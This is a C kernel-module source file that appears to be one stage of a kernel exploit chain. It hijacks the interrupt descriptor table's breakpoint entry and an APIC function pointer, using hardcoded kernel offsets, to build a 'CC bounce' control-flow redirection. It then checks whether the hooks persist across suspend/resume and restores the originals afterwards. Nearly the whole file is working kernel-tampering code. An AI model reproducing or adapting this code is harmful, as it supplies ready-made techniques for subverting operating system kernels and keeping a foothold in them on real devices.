#include <stdint.h>

/*
 * resume_chain v9a — CC bounce persistence test
 *
 * Tests the doreti_iret bounce with the CONFIRMED CC byte at
 * get_timer_freq - 1 (ktext+0x29431F). This is v7 mode 0x2 redux
 * but with the correct CC byte (v7 failed because xapic_mode-1 = C3).
 *
 * Modes (selected by fw_ver):
 *   0x0901 = ARM:      Set IDT[3]=doreti_iret IST=0, apic_ops[2]=CC byte
 *   0x0903 = READBACK: After resume, verify persistence, restore originals
 *
 * The CC bounce flow during LAPIC resume:
 *   call *apic_ops[2]  (= get_timer_freq - 1 = CC byte)
 *   → INT3 fires
 *   → IDT[3] = doreti_iret (iretq)
 *   → CPU pushes {RIP=get_timer_freq, CS, RFLAGS, RSP, SS}
 *   → iretq pops everything back
 *   → get_timer_freq executes, returns 0x13b0
 *   → clean return to LAPIC caller
 *
 * Self-sustaining: works every call, every CPU, every suspend/resume.
 * No IST, no ROP chain, no multi-CPU race.
 *
 * Output layout (64 uint64_t slots):
 *   out[0]  = MAGIC (lo32) + status (hi32)
 *   out[1]  = kdata_base
 *   out[2]  = ktext_base
 *
 * ARM (0x0901):
 *   out[3]  = doreti_iret address
 *   out[4]  = original xapic_mode (apic_ops[2])
 *   out[5]  = CC target (get_timer_freq - 1)
 *   out[6]  = original IDT[3] handler
 *   out[7]  = new IDT[3] handler (should = doreti_iret)
 *   out[8]  = original IDT[3] lo qword (saved for restore)
 *   out[9]  = original IDT[3] hi qword (saved for restore)
 *   out[10] = original apic_ops[2] value (saved for restore)
 *   out[63] = end marker
 *
 * READBACK (0x0903):
 *   out[3]  = persist check: IDT[3] handler
 *   out[4]  = persist check: apic_ops[2] value
 *   out[5]  = armed marker from kdata+0x200
 *   out[6]  = armed mode from kdata+0x208
 *   out[7]  = current IDT[3] lo qword
 *   out[8]  = current IDT[3] hi qword
 *   out[9]  = idt3 handler persisted? (1=yes)
 *   out[10] = apic_ops[2] persisted? (1=yes)
 *   out[11] = restored IDT[3]? (1=yes)
 *   out[12] = restored apic_ops[2]? (1=yes)
 *   out[63] = end marker
 */

#define MAGIC_RSCN       0x5253434E
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218
#define OFF_APIC_OPS     0x1934AC8
#define OFF_IDT          0x64cdc80
#define OFF_DORETI_IRET  (-0x9cf84c)
#define OFF_GET_TIMER_FREQ 0x294320
#define IDT_ENTRY_SIZE   16

/* Persistence area in kdata (survives suspend/resume) */
#define PERSIST_BASE     0x200
#define PERSIST_MARKER   (PERSIST_BASE + 0x00)  /* 8 bytes: armed marker */
#define PERSIST_MODE     (PERSIST_BASE + 0x08)  /* 8 bytes: armed mode */
#define PERSIST_IDT3_LO  (PERSIST_BASE + 0x10)  /* 8 bytes: original IDT[3] lo */
#define PERSIST_IDT3_HI  (PERSIST_BASE + 0x18)  /* 8 bytes: original IDT[3] hi */
#define PERSIST_APIC2    (PERSIST_BASE + 0x20)  /* 8 bytes: original apic_ops[2] */

#define ARMED_MARKER     0xCC90CC90CC90CC90ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

/* Extract handler address from IDT gate descriptor */
static uint64_t idt_get_handler(uint64_t idt_entry_addr)
{
    uint16_t lo = read2(idt_entry_addr + 0);
    uint16_t mid = read2(idt_entry_addr + 6);
    uint32_t hi = read4(idt_entry_addr + 8);
    return (uint64_t)lo | ((uint64_t)mid << 16) | ((uint64_t)hi << 32);
}

static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    write2(idt_entry_addr + 0, (uint16_t)(handler & 0xFFFF));
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    write2(idt_entry_addr + 6, (uint16_t)((handler >> 16) & 0xFFFF));
    write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    /* Clear output buffer */
    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;

    out[1] = kdata_base;
    out[2] = ktext_base;

    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
    uint64_t apic_ops_2_addr = apic_ops_addr + 2 * 8;
    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
    uint64_t cc_target = ktext_base + OFF_GET_TIMER_FREQ - 1;

    uint16_t mode = fw_ver & 0xFFFF;

    if (mode == 0x0901) {
        /* === ARM MODE === */

        /* Read originals */
        uint64_t orig_idt3_lo = read8(idt3_addr);
        uint64_t orig_idt3_hi = read8(idt3_addr + 8);
        uint64_t orig_handler = idt_get_handler(idt3_addr);
        uint64_t orig_apic2 = read8(apic_ops_2_addr);

        /* Save originals to persistence area (survives suspend/resume) */
        write8(kdata_base + PERSIST_IDT3_LO, orig_idt3_lo);
        write8(kdata_base + PERSIST_IDT3_HI, orig_idt3_hi);
        write8(kdata_base + PERSIST_APIC2, orig_apic2);

        /* Set IDT[3] = doreti_iret, IST=0 */
        idt_set_handler(idt3_addr, doreti_iret, 0);

        /* Set apic_ops[2] = get_timer_freq - 1 (CC byte) */
        write8(apic_ops_2_addr, cc_target);

        /* Write armed marker LAST */
        write8(kdata_base + PERSIST_MODE, 0x0901);
        __asm__ volatile("mfence" ::: "memory");
        write8(kdata_base + PERSIST_MARKER, ARMED_MARKER);

        /* Report */
        out[3] = doreti_iret;
        out[4] = orig_apic2;
        out[5] = cc_target;
        out[6] = orig_handler;
        out[7] = idt_get_handler(idt3_addr);  /* verify: should = doreti_iret */
        out[8] = orig_idt3_lo;
        out[9] = orig_idt3_hi;
        out[10] = orig_apic2;
        out[63] = 0xdeadbeefcafe0901ULL;

        out32[1] = 0x0191;  /* v9a ARM complete */
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;

    } else if (mode == 0x0903) {
        /* === READBACK MODE (after resume) === */

        /* Read current state */
        uint64_t cur_handler = idt_get_handler(idt3_addr);
        uint64_t cur_apic2 = read8(apic_ops_2_addr);
        uint64_t marker = read8(kdata_base + PERSIST_MARKER);
        uint64_t armed_mode = read8(kdata_base + PERSIST_MODE);
        uint64_t cur_idt3_lo = read8(idt3_addr);
        uint64_t cur_idt3_hi = read8(idt3_addr + 8);

        /* Read saved originals */
        uint64_t saved_idt3_lo = read8(kdata_base + PERSIST_IDT3_LO);
        uint64_t saved_idt3_hi = read8(kdata_base + PERSIST_IDT3_HI);
        uint64_t saved_apic2 = read8(kdata_base + PERSIST_APIC2);

        /* Check persistence */
        int idt3_persisted = (cur_handler == doreti_iret) ? 1 : 0;
        int apic2_persisted = (cur_apic2 == cc_target) ? 1 : 0;

        /* Restore originals */
        write8(idt3_addr, saved_idt3_lo);
        write8(idt3_addr + 8, saved_idt3_hi);
        write8(apic_ops_2_addr, saved_apic2);

        /* Verify restoration */
        int idt3_restored = (read8(idt3_addr) == saved_idt3_lo) ? 1 : 0;
        int apic2_restored = (read8(apic_ops_2_addr) == saved_apic2) ? 1 : 0;

        /* Clear armed marker */
        write8(kdata_base + PERSIST_MARKER, 0);

        /* Report */
        out[3] = cur_handler;
        out[4] = cur_apic2;
        out[5] = marker;
        out[6] = armed_mode;
        out[7] = cur_idt3_lo;
        out[8] = cur_idt3_hi;
        out[9] = idt3_persisted;
        out[10] = apic2_persisted;
        out[11] = idt3_restored;
        out[12] = apic2_restored;
        out[63] = 0xdeadbeefcafe0903ULL;

        out32[1] = 0x0193;  /* v9a READBACK complete */
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;

    } else {
        /* Unknown mode */
        out[3] = mode;
        out32[1] = 0x00FD;
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_RSCN;
    }

    return 0;
}
